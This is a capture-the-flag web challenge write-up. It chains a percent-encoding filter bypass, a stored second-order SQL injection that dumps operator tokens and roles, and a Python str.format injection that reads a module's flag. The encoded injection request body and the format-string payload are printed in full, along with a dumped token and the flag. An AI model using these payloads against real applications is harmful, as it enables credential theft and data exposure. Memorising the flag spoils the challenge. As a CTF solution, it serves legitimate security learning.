# Operation Dawn: The Dispatch Console

**Category:** Web

## Solution

1. I found that the sanitizer checked raw percent-encoded input before the app decoded it. Encoding the first letters of `UNION` and `SELECT` as `%55NION` and `%53ELECT` bypassed that check.
2. I stored a payload as a callsign through `POST /post`. The injection ran later, when `/digest` placed stored callsigns into another SQL query. A one-column `UNION` worked, so I used `sqlite_master` to find the table schema.
3. I dumped callsigns, tokens, and roles from `operators`. This is the saved request body for that step; I sent it as raw form data so the `%` escapes were not encoded a second time:

   ```text
   callsign=QD%27%20%55NION%20%53ELECT%20callsign%7C%7C%27%20%3A%3A%20%27%7C%7Ctoken%7C%7C%27%20%3A%3A%20%27%7C%7Crole%20FROM%20operators%20WHERE%20%271%27%20LIKE%20%271&body=p
   ```

   In the digest output, `WARDEN` had role `command` and token `AC-37db1623e76268c531d1e634`.
4. I used that token on `/report`. Its `fmt` parameter reached Python `str.format`, so this field expression read the module's flag:

   ```text
   {dispatch.__init__.__globals__[FLAG]}
   ```

5. The saved report response contains the flag below. This chain combined stored SQL injection with a separate format-string read after the token gate.

## Flag

```text
CSCTF{h9u5muEK5jMwLuVspcPVABN9}
```

> **Note:** I kept the flag from the recorded instance response. A later local mock used a fake flag; I have not rerun that test or the original service, and the mock and solver are not included here.
